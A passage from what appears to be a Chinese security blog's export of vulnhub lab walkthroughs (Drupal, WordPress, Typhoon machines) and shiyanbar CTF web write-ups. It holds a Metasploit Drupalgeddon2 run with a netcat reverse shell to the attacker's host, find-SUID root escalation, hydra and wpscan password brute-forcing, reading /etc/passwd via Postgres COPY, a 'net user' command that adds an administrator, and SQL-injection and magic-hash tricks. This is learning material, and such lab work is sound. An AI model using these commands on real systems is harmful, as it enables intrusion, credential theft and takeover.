22/tcp on 192.168.41.168 Discovered open port 80/tcp on 192.168.41.168 发现80端口是一个cms，名字叫drupal metasploit搜索一下drupal的渗透模块 123456789101112msf5 &gt; search drupalMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 1 auxiliary/gather/drupal_openid_xxe 2012-10-17 normal Yes Drupal OpenID External Entity Injection 2 auxiliary/scanner/http/drupal_views_user_enum 2010-07-02 normal Yes Drupal Views Module Users Enumeration 3 exploit/multi/http/drupal_drupageddon 2014-10-15 excellent No Drupal HTTP Parameter Key/Value SQL Injection 4 exploit/unix/webapp/drupal_coder_exec 2016-07-13 excellent Yes Drupal CODER Module Remote Command Execution 5 exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection 然后设置相关参数，获得shell 123456789101112131415161718msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.41.168RHOSTS =&gt; 192.168.41.168msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit [*] Started reverse TCP handler on 192.168.41.165:4444 [*] Sending stage (38247 bytes) to 192.168.41.168[*] Meterpreter session 1 opened (192.168.41.165:4444 -&gt; 192.168.41.168:41848) at 2019-08-09 09:48:32 -0400meterpreter &gt; meterpreter &gt; lsListing: /var/www=================Mode Size Type Last modified Name---- ---- ---- ------------- ----100644/rw-r--r-- 174 fil 2013-11-20 15:45:59 -0500 .gitignore100644/rw-r--r-- 5767 fil 2013-11-20 15:45:59 -0500 .htaccess 但是之后只能获得一个Meterpreter,不是root用户也没法运行Linux的常用命令，于是想到修改payload 123456msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set payload php/execpayload =&gt; php/execmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set CMD nc 192.168.41.165 2333 -c /bin/bashCMD =&gt; nc 192.168.41.165 2333 -c /bin/bashmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit 此时本机监听一个2333端口，成功反弹shell 123456789$ nc -lvp 2333 listening on [any] 2333 ...192.168.41.168: inverse host lookup failed: Unknown hostconnect to [192.168.41.165] from (UNKNOWN) [192.168.41.168] 60424lsCOPYRIGHT.txtINSTALL.mysql.txtINSTALL.pgsql.txtINSTALL.sqlite.txt 此时上提权辅助脚本： wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 添加可执行权限并且运行，重点关注： 1234567891011121314151617181920[-] SUID files:-rwsr-xr-x 1 root root 88744 Dec 10 2012 /bin/mount-rwsr-xr-x 1 root root 31104 Apr 13 2011 /bin/ping-rwsr-xr-x 1 root root 35200 Feb 27 2017 /bin/su-rwsr-xr-x 1 root root 35252 Apr 13 2011 /bin/ping6-rwsr-xr-x 1 root root 67704 Dec 10 2012 /bin/umount-rwsr-sr-x 1 daemon daemon 50652 Oct 4 2014 /usr/bin/at-rwsr-xr-x 1 root root 35892 Feb 27 2017 /usr/bin/chsh-rwsr-xr-x 1 root root 45396 Feb 27 2017 /usr/bin/passwd-rwsr-xr-x 1 root root 30880 Feb 27 2017 /usr/bin/newgrp-rwsr-xr-x 1 root root 44564 Feb 27 2017 /usr/bin/chfn-rwsr-xr-x 1 root root 66196 Feb 27 2017 /usr/bin/gpasswd-rwsr-sr-x 1 root mail 83912 Nov 18 2017 /usr/bin/procmail-rwsr-xr-x 1 root root 162424 Jan 6 2012 /usr/bin/find-rwsr-xr-x 1 root root 937564 Feb 11 2018 /usr/sbin/exim4-rwsr-xr-x 1 root root 9660 Jun 20 2017 /usr/lib/pt_chown-rwsr-xr-x 1 root root 248036 Jan 27 2018 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 5412 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-- 1 root messagebus 321692 Feb 10 2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 84532 May 22 2013 /sbin/mount.nfs 但是此时并没有什么用，我们这里要讲的是用fing命令提权 find 之exec 随便创建一个文件touch anquanke 然后find查找并且加上-exec选项： 12find anquanke -exec &apos;whoami&apos; \;root 发现此时是root用户，于是执行/bin/sh 123find anquanke -exec &apos;/bin/sh&apos; \;whoamiroot 至此提权成功了 DC-6靶机——wordpress渗透 老规矩探测靶机的ip，然后扫描端口发现开放了80，按照下载时作者的提示需要修改hosts文件 12345678$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 kali192.168.41.129 wordy# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters 之前kali上的wpscan有问题，更新镜像源重新升级了一下 wpscan --url http://wordy/ -e -t 20 直接扫一下看能有什么结果 扫描到用户： 12345678910111213141516171819202122232425[i] User(s) Identified:[+] admin | Detected By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] mark | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] sarah | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] jens | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] graham | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 下一步根据上面下载地址处作者的提示，我们生产一个字典包 12# root @ kali in ~ [21:29:41] $ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt 之后使用wpscan爆破密码，登陆后台开始提权 参考 Linux 反弹shell（二）反弹shell的本质 渗透测试实战-DC-1:1靶机入侵+Matrix2靶机入侵 渗透测试实战——DC-5+DC-6靶机入侵 Linux提权辅助脚本 Game-of-Thrones-CTF-1靶机复现 一个很有意思的靶机 扫描靶机ip地址 1234567# root @ kali in ~ [19:58:22] $ arp-scan 192.168.19.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.19.2 00:50:56:f9:02:e9 VMware, Inc.192.168.19.131 00:0c:29:d0:e7:e1 VMware, Inc. ---&gt; 靶机192.168.19.254 00:50:56:e8:10:0e VMware, Inc. 扫描端口 1234567891011121314# root @ kali in ~ [19:59:38] $ masscan -p0-65535 192.168.19.131 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-10 23:59:47 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 80/tcp on 192.168.19.131 Discovered open port 21/tcp on 192.168.19.131 Discovered open port 1337/tcp on 192.168.19.131 Discovered open port 10000/tcp on 192.168.19.131 Discovered open port 53/tcp on 192.168.19.131 Discovered open port 22/tcp on 192.168.19.131 Discovered open port 5432/tcp on 192.168.19.131 扫描端口对应的服务： 12345678910111213141516171819202122232425# root @ kali in ~ [20:00:24] $ nmap -sV -T4 192.168.19.131 Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:02 EDTStats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 83.33% done; ETC: 20:04 (0:00:19 remaining)Nmap scan report for 192.168.19.131Host is up (0.000085s latency).Not shown: 992 closed portsPORT STATE SERVICE VERSION21/tcp open ftp?22/tcp open ssh Linksys WRT45G modified dropbear sshd (protocol 2.0)53/tcp open domain (unknown banner: Bind)80/tcp open http Apache httpd143/tcp filtered imap3306/tcp filtered mysql5432/tcp open postgresql PostgreSQL DB 9.6.4 - 9.6.610000/tcp open http MiniServ 1.590 (Webmin httpd)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port21-TCP:V=7.70%I=7%D=8/10%Time=5D4F5B1F%P=x86_64-pc-linux-gnu%r(GeneSF:ricLines,11C,&quot;220-------------------------\r\n220-\&quot;These\x20are\x20theSF:\x20Dorne\x20city\x20walls\.\x20We\x20must\x20enter!\&quot;\x20-\x20Grey\x20SF:Worm\r\n220-\r\n220-\&quot;A\x20fail2ban\x20spell\x20is\x20protecting\x20theSF:se\x20walls\.\x20You&apos;ll\x20never\x20get\x20in\&quot;\x20-\x20One\x20of\x20th... 此时80端口是开放的，所以可以扫描一下目录： 123456789[20:04:36] 200 - 1KB - /favicon.ico[20:04:37] 301 - 232B - /h -&gt; http://192.168.19.131/h/[20:04:37] 200 - 3KB - /index.php/login/[20:04:37] 200 - 3KB - /index.php[20:04:37] 301 - 233B - /js -&gt; http://192.168.19.131/js/[20:04:38] 301 - 236B - /music -&gt; http://192.168.19.131/music/[20:04:40] 200 - 135B - /robots.txt[20:04:40] 403 - 222B - /server-status[20:04:40] 403 - 223B - /server-status/ robots.txt文件 依次访问这些页面，同时记得查看源代码，具体的分析之后再搞 1234 /the-tree/User-agent: *Disallow: /secret-island/Disallow: /direct-access-to-kings-landing/ 参考 Game-of-Thrones-CTF-1靶机完全攻略 DC-2靶机 同样的扫描靶机ip，然后扫描端口，之后扫描端口对应的服务 发现开放了80和7744端口 1234567891011121314# root @ kali in ~/dirsearch on git:master o [20:46:10] $ nmap -sV -p80,7744 192.168.19.132Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:47 EDTNmap scan report for 192.168.19.132Host is up (0.00046s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)MAC Address: 00:0C:29:6A:1A:54 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds 然后修改hosts文件，打开网址发现又是一个wordpress flag页面提示用cewl命令生成一个字典 cewl -w dc2_passwords.txt http://dc-2 用wpscan扫描出用户名，然后再用wpscan爆破密码 wpscan --url http://dc-2/ -e -t 20 wpscan --url http://dc-2/ -U user.txt -P dc2_passwords.txt 123[i] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>nmap</tag>
        <tag>提权</tag>
        <tag>masscan</tag>
        <tag>find</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[typhoon靶机渗透]]></title>
    <url>%2F2019%2F08%2F09%2Ftyphoon%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。 今天又重新从 https://vulnhub.com 上把靶机搞下来装到Vmware上自己实验 靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用arp-scan和masscan工具 1234567891011# root @ kali in ~ [3:04:28] C:1$ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.166 00:0c:29:d7:ef:a4 VMware, Inc.192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc.62 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.5: 256 hosts scanned in 7.212 seconds (35.50 hosts/sec). 4 responded 前两个是类似网关的，第四个是kali的ip，中间第三个就是靶机的ip地址 用masscan也可以发现,同时端口也可以扫出来 12345678910111213141516171819202122232425262728293031# root @ kali in ~ [3:04:28] C:1$ masscan -p0-65535 192.168.41.0/24 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 07:05:04 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 256 hosts [65536 ports/host]Discovered open port 631/tcp on 192.168.41.166 Discovered open port 139/tcp on 192.168.41.166 Discovered open port 80/tcp on 192.168.41.166 Discovered open port 22/tcp on 192.168.41.166 Discovered open port 5432/tcp on 192.168.41.166 Discovered open port 995/tcp on 192.168.41.166 Discovered open port 110/tcp on 192.168.41.166 Discovered open port 445/tcp on 192.168.41.166 Discovered open port 3306/tcp on 192.168.41.166 Discovered open port 27017/tcp on 192.168.41.166 Discovered open port 44337/tcp on 192.168.41.166 Discovered open port 6379/tcp on 192.168.41.166 Discovered open port 53/tcp on 192.168.41.2 Discovered open port 25/tcp on 192.168.41.166 Discovered open port 40811/tcp on 192.168.41.166 Discovered open port 33070/tcp on 192.168.41.166 Discovered open port 993/tcp on 192.168.41.166 Discovered open port 43074/tcp on 192.168.41.166 Discovered open port 21/tcp on 192.168.41.166 Discovered open port 53/tcp on 192.168.41.166 Discovered open port 2049/tcp on 192.168.41.166 Discovered open port 37535/tcp on 192.168.41.166 Discovered open port 8080/tcp on 192.168.41.166 Discovered open port 143/tcp on 192.168.41.166 nmap扫描最常用命令nmap -sV -A -p- ip可以扫描到靶机开放的端口和服务，当然那台靶机开放了好多好多个端口，需要记住一些常用的端口和它们对应的服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384Nmap scan report for 192.168.110.164Host is up (0.00034s latency).Not shown: 985 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.2|_ftp-anon: Anonymous FTP login allowed (FTP code 230)|_ftp-bounce: bounce working!| ftp-syst: | STAT: | FTP server status:| Connected to 192.168.110.72| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.2 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)| 2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)| 256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)|_ 256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)25/tcp open smtp?|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 53/tcp open domain ISC BIND 9.9.5-3 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.9.5-3-Ubuntu80/tcp open http Apache httpd 2.4.7 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry |_/mongoadmin/|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Typhoon Vulnerable VM by PRISMA CSI110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE STLS SASL CAPA UIDL RESP-CODES|_ssl-date: TLS randomness does not represent time111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/udp nfs| 100005 1,2,3 43523/tcp mountd| 100005 1,2,3 58512/udp mountd| 100021 1,3,4 39728/udp nlockmgr| 100021 1,3,4 59010/tcp nlockmgr| 100024 1 39860/udp status| 100024 1 57414/tcp status| 100227 2,3 2049/tcp nfs_acl|_ 100227 2,3 2049/udp nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd (Ubuntu)|_imap-capabilities: OK more Pre-login have post-login listed capabilities IMAP4rev1 LOGINDISABLEDA0001 ID IDLE STARTTLS ENABLE LITERAL+ SASL-IR LOGIN-REFERRALS|_ssl-date: TLS randomness does not represent time445/tcp open netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)993/tcp open ssl/imaps?|_ssl-date: TLS randomness does not represent time995/tcp open ssl/pop3s?|_ssl-date: TLS randomness does not represent time2049/tcp open nfs_acl 2-3 (RPC #100227)3306/tcp open mysql?|_mysql-info: ERROR: Script execution failed (use -d to debug)8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1| http-methods: | Supported Methods: GET HEAD POST PUT DELETE OPTIONS|_ Potentially risky methods: PUT DELETE|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache-Coyote/1.1|_http-title: Apache TomcatWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAPRunning: Actiontec embedded, LinuxOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernelOS details: Actiontec MI424WR-GEN3I WAPNetwork Distance: 2 hopsTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: IncrementalService Info: Host: TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 同时还有一个扫描结果：以前似乎没有看到过 12345678910111213141516171819202122232425262728293031323334Host script results:|_clock-skew: mean: 6h59m59s, deviation: 1h43m54s, median: 7h59m58s| nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:| TYPHOON&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;| TYPHOON&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;| TYPHOON&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;| \x01\x02__MSBROWSE__\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt;|_ WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;| smb-os-discovery: | OS: Unix (Samba 4.1.6-Ubuntu)| Computer name: typhoon| NetBIOS computer name: TYPHOON\x00| Domain name: local| FQDN: typhoon.local|_ System time: 2019-08-09T11:30:49+03:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-08-09 04:30:48|_ start_date: N/ATRACEROUTE (using port 80/tcp)HOP RTT ADDRESS1 0.04 ms 192.168.41.22 0.17 ms 192.168.110.164 我最先打的是2049端口，因为这个端口对应的是nfs服务，用这条命令： nmap -sV --script=nfs-showmount ip扫出可以远程挂载的目录 之后尝试挂载，但是我无法用get命令将文件拷贝下来emmmm，主机也没有对应的挂载目录。 队友打了21号端口，但是信息也不是很多 22号端口是ssh服务，A组的师傅爆出了密码，参考安全客上的方法，可以先枚举用户名， 发现靶机名字为typhoon就想着去测试一下看看账号存不存在,利用ssh用户枚举漏洞进行测试 在GitHub上找了一个ssh_enum的脚本，尝试一下还行但是没有好字典 hydra可以爆破弱口令： hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150 第一次渗透感觉还不是很熟练，能够做到的就是这些😢 21号端口 search ftp_version收集ftp服务器的信息 12345msf5 auxiliary(scanner/ftp/ftp_version) &gt; exploit [+] 192.168.41.166:21 - FTP Banner: &apos;220 (vsFTPd 3.0.2)\x0d\x0a&apos;[*] 192.168.41.166:21 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 如果这个版本的ftp有漏洞的话是不是可以getshell？ 浏览器直接访问并没有什么东西 尝试使用exploit/unix/ftp/vsftpd_234_backdoor进行渗透但是没成功 22端口 尝试枚举用户名为typhoon 成功枚举 使用hydra去爆破密码hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.41.166 25端口smtp服务 获取到服务器的信息 12345msf5 auxiliary(scanner/smtp/smtp_version) &gt; exploit [+] 192.168.41.166:25 - 192.168.41.166:25 SMTP 220 typhoon ESMTP Postfix (Ubuntu)\x0d\x0a[*] 192.168.41.166:25 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 5432端口postgresql服务 补充一点postgresql操作： 列出数据库\l： 12345678910postgres=# \l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres(3 rows) 列出table'\d': 123456ostgres=# \d List of relations Schema | Name | Type | Owner --------+-------+-------+---------- public | mrlee | table | postgres(1 row) 之后使用metasploit的模块去收集信息 12345msf5 auxiliary(scanner/postgres/postgres_version) &gt; exploit [*] 192.168.41.166:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 直接发现弱口令 1234[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)[+] 192.168.41.166:5432 - Login Successful: postgres:postgres@template1[-] 192.168.41.166:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password) 然后登陆 1234567# root @ kali in ~ [3:34:50] C:127$ psql -h 192.168.41.166 -U postgresPassword for user postgres: psql (11.2 (Debian 11.2-2), server 9.3.4)Type &quot;help&quot; for help.postgres=# help select pg_ls_dir('./');列出目录 1234567891011121314151617181920postgres=# select pg_ls_dir(&apos;./&apos;); pg_ls_dir ----------------- PG_VERSION pg_notify pg_multixact pg_subtrans pg_serial pg_snapshots pg_stat pg_clog pg_xlog base pg_twophase pg_tblspc global pg_stat_tmp postmaster.opts postmaster.pid(16 rows) 建表并且从/etc/passwd中拷贝数据过来再读取,（这个姿势第一次见） 1234567891011121314151617181920postgres=# DROP TABLE if EXISTS MrLee;NOTICE: table &quot;mrlee&quot; does not exist, skippingDROP TABLEpostgres=# CREATE TABLE MrLee(t TEXT);CREATE TABLEpostgres=# COPY MrLee FROM &apos;/etc/passwd&apos;;COPY 44postgres=# SELECT * FROM MrLee limit 1 offset 0; t --------------------------------- root:x:0:0:root:/root:/bin/bash(1 row)postgres=# SELECT * FROM MrLee; t ----------------------------------------------------------------------------------- root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin DC1靶机 姿势： find命令提权，hydra爆破，Drupal重置管理员密码 需要积累一些靶机渗透的经验 msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https msf各种弱口令爆破 同时需要熟悉find和grep命令 Linux find和grep命令 熟悉一下各种cms的常见姿势 忘记Drupal的管理员密码的解决办法 metasploit渗透mssql服务 1433端口对应于mssql服务，第一步一般是弱口令： use auxiliary/scanner/mssql/mssql_login 然后设置字典路径和远程主机即可 还可以使用auxiliary/scanner/mssql/mssql_ping进一步收集信息 之后尝试登陆mssql服务 use auxiliary/admin/mssql/mssql_exec 可以设置cmdset CMD cmd.exe /c net user 添加管理员用户，远程登陆： cmd.exe /c net user shenlan test /add&amp;net localgroup administrator shenlan /add 开启3389端口一般是提供远程桌面服务， 渗透之——Metasploit渗透MSSQL masscan扫描工具 扫描指定网络和端口： masscan.exe -p80 192.168.81.1/24 扫描指定主机所有开放的端口： masscan.exe -p0-65535 192.168.81.143 --banners可以获取服务器的banner信息 --echo选项将配置信息保存下来，这样可以下一次快速扫描 masscan.exe -p80,443,3306 192.168.81.143 --banners --echo&gt;1.conf 保存配置信息 masscan.exe -c 1.conf 读取配置信息 --rate提高扫描速度 渗透技巧：Windows平台运行Masscan和Nmap nmap高级使用技巧 nmap常见的扫描方式： 半开放扫描: -sS 没有建立三次握手连接，速度很快 全连接扫描：-sT 三次握手过程，速度较慢 扫描UDP端口： -sU]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>nfs</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧web]]></title>
    <url>%2F2019%2F08%2F06%2F%E5%AE%9E%E9%AA%8C%E5%90%A7web%2F</url>
    <content type="text"><![CDATA[记录一下实验吧的wp 后台登陆 ctrl+u查看源码 123456789&lt;!-- $password=$_POST['password']; $sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo 'flag is :'.$flag; &#125; else&#123; echo '密码错误!'; &#125; --&gt; 一上来就问管理员密码，并且要求登陆，那么是爆破呢，还是爆破呢？ emmmmm其实这题的考点是md5的 查了一下官方文档，md5函数的第二个参数如果为true,那么就会返回原始16字符二进制格式 而且sql语句显然是可以拼接注入的，关键在于如何注入了 提供一个字符串： ffifdyop md5后，276f722736c95d99e921722cf9ed621c再转成字符串:' ' 'or' 6&lt;trach&gt;解析:存在 or 即代码的两边有一边为真既可以绕过，&lt;trach&gt;其实为垃圾代码没有任何用的。or 后面有6，非零值即为真。既可以成功绕过。 http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php 当然看评论也有说密码就是e58的 参考 认真一点 这道题是盲注的题目，不太好搞 天下武功唯快不破 这个可以通过浏览器抓包，然后发现响应头中有一个FLAG字段显然是base64加密过的，解密之后就会得到提示，让你写脚本post提交 我写的垃圾代码如下： 1234567891011121314151617import urllibimport base64import requestsres = urllib.urlopen("http://ctf5.shiyanbar.com/web/10/10.php")head = str(res.headers)FLAG = head[head.index('FLAG')+6:head.index('FLAG')+48+6]flagBase64 = base64.decodestring(FLAG)TrueFlag = flagBase64[flagBase64.index(':')+1:]data = &#123;'key': TrueFlag&#125;res = requests.post(url='http://ctf5.shiyanbar.com/web/10/10.php', data=data)print res.content 师傅写的代码比我好看多了 12345678910111213# coding:utf8import requestsimport base64url = "http://ctf4.shiyanbar.com/web/10.php" # 目标URLs = requests.Session() # 获取 Sessionresponse = s.get(url) # 打开链接head = response.headers # 获取响应头flag = base64.b64decode(head['flag']).split(':')[1] # 获取相应头中的Flagprint flag # 打印FlagpostData = &#123;'key': flag&#125; # 构造Post请求体result = s.post(url=url, data=postData) # 利用Post方式发送请求# (注意要在同一个Session中 , 有的时候还需要设置Cookies , 但是此题不需要)print result.text # 打印响应内容 拐弯抹角 这个涉及到我的知识盲区，叫做伪静态页面 百度百科 payload http://ctf5.shiyanbar.com/indirection/index.php/a/index.php Forms 作为网络安全的人才，一定要仔细观察每一处地方 比如这个题目的表单： 12345&lt;form action="" method="post"&gt; PIN:&lt;br&gt; &lt;input type="password" name="PIN" value=""&gt; &lt;input type="hidden" name="showsource" value=0&gt; &lt;button type="submit"&gt;Enter&lt;/button&gt; 很明显看到，有一个hidden字段，而且是showsource,如果将其修改为1就能得到源码 源码如下： 12345678&lt;?php$a = $_POST["PIN"];if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo "Congratulations! The flag is $flag";&#125; else &#123; echo "User with provided PIN not found.";&#125;?&gt; emmmm后面就不说了 天网管理系统 查看源码有隐藏字段 1&lt;!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --&gt; 联想到php代码审计的小trick md5(QNKCDZO)得到的结果是0e开头的 得到提示， 访问http://ctf5.shiyanbar.com/10/web1/user.php?fame=hjkleffifer 得到： 1$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年 天真的我以为那三个问号就是真的问号 唉。。 12345678&lt;?php$a = array('user'=&gt;true, 'pass'=&gt;true);$b = serialize($a);$c = unserialize($b);var_dump($b);?&gt; 将这个作为password输入a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;} 忘记密码 这个题目有点难度 不过还是要获取信息 查看源代码发现两处关键信息： 12&lt;meta name="admin" content="admin@simplexue.com" /&gt;&lt;meta name="editor" content="Vim" /&gt; 告诉了你管理员的邮箱和vim。。告诉我vim干嘛？当然是swp文件了 此处访问http://ctf5.shiyanbar.com/10/upload/.submit.php.swp可以得到swp文件 (这是通过抓包知道发现表单上传的就是这个文件，多试几次，记得在文件名前加*.*) 12345678910111213141516171819202122232425262728293031323334353637383940414243........这一行是省略的代码......../*如果登录邮箱地址不是管理员则 die()数据库结构---- 表的结构 `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- 转存表中的数据 `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, 